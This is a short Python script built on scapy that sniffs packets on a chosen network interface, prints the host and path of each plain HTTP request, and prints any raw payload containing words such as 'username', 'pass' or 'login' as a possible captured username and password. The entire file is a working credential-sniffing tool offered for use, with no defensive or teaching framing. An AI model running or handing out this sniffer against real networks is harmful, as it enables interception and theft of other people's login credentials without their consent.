#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import optparse, platform

def checkOS():
    if "Linux" in platform.system():
        return True
    else:
        return False

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Enter an interface name")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info")
    return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "pass", "password", "login"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request => " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[!] Possible username/password => " + login_info + "\n\n")

if __name__ == "__main__":
    ch = checkOS()
    if ch:
        options = get_arguments()
        sniff(options.interface)
    else:
        print("[-] Your OS is not linux!")